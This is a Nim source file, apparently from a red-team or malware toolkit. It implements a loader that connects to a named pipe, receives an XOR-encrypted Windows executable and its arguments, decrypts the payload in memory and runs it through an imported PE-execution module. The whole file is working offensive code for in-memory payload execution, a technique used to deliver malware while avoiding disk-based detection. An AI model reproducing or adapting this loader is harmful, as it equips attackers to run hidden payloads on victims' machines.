# Import the correct module for the execution type
import ../rth/local-execution/execute_pe
import ../rth/rth
import ../rth/utils/utils
import winim
import os
import winim/winstr
import strformat



proc malMain() =

  # Create NamedPipe Client
  var pipe: HANDLE = CreateFile(
      r"\\.\pipe\dafuqdafuq",
      GENERIC_READ or GENERIC_WRITE,
      FILE_SHARE_READ or FILE_SHARE_WRITE,
      NULL,
      OPEN_EXISTING,
      FILE_ATTRIBUTE_NORMAL,
      0
  )

  if bool(pipe):
    echo "[*] Connected to server"
    try:
      var
        payloadSize: DWORD
        argsSize: DWORD
        bytesRead: DWORD
        result: BOOL

      # Read the sizes first
      result = ReadFile(
              pipe,
              addr payloadSize,
              cast[DWORD](sizeof(DWORD)),
              addr bytesRead,
              NULL
          )

      echo "[*] bytes read: ", bytesRead
      result = ReadFile(
              pipe,
              addr argsSize,
              cast[DWORD](sizeof(DWORD)),
              addr bytesRead,
              NULL
          )


      var buffer = newSeq[byte](payloadSize)
      var args: cstring = cast[cstring](alloc(argsSize))

      result = ReadFile(
              pipe,
              cast[LPVOID](addr buffer[0]),
              cast[DWORD](payloadSize),
              addr bytesRead,
              NULL
          )

      result = ReadFile(
              pipe,
              cast[LPVOID](args),
              cast[DWORD](argsSize),
              addr bytesRead,
              NULL
          )

      echo buffer[0..100]
      echo "Arguments: " & $args

      MessageBox(0, fmt"Argument: {$args}", "Nim is Powerful", 0)


      var pl: Payload = Payload(
          bytes: buffer,
          isEncrypted: true,
          arguments: parseCmdLine($args)
      )
      pl.decrypt(0x5F)
      #writeFile("C:\\temp\\OUTERINO.exe", pl.bytes)

      MessageBox(0, "received Payload !", "Nim is Powerful", 0)
      var status = pl.execute()

      if not status:
        echo "[-] Failed to execute PE"
    finally:
        CloseHandle(pipe)






malMain()
